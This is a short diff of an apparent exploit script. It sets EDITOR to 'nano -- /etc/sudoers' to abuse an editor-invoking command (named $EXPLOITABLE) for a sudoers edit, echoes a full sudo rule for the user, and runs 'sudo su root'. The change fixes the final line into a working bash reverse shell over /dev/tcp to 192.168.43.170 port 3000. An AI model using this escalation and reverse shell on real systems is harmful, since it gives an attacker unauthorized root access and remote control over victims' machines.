@@ -38,6 +38,6 @@ echo "$USER ALL=(ALL:ALL) ALL"
 read -n 1 -s -r -p "Press any key to continue..."
 EDITOR="nano -- /etc/sudoers" $EXPLOITABLE
 sudo su root
--i >& /dev/tcp/192.168.43.170/3000 0>&1
+/bin/bash -i >& /dev/tcp/192.168.43.170/3000 0>&1
 exit 0
 
